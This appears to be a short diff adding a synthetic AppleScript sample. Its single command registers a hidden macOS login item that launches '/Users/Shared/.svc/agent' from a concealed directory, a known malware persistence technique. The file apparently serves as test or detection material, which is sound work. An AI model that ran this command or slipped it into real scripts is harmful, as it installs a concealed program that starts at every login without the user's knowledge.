@@ -1,0 +1,2 @@
+-- synthetic AppleScript text
+tell application "System Events" to make login item at end with properties {path:"/Users/Shared/.svc/agent", hidden:true}
